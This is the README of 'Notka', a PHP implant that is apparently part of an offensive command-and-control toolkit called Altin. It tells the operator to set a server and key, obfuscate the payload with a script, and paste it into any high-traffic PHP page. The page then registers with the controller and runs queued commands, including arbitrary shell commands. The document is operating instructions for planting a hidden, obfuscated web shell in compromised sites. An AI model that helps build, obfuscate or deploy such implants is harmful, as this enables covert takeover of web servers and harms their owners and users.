# Notka

A minimal PHP implant meant to be dropeed into a high traffic PHP page. Requesting the page registeres the implant with Altin and runs all commands queued.

## Config
Set the `$server` and `$key` in `notka.php`

## Obfuscate
The payload can be obfuscated by running the `obfuscate.py` script, it will output the obfuscated version to `payload.php`.

## Deployment
The contents of `payload.php` can the be pasted into any PHP page.

## Commands
|Command|Description|Arguments|
|---|---|---|
|`shell`|Run a command|command: str|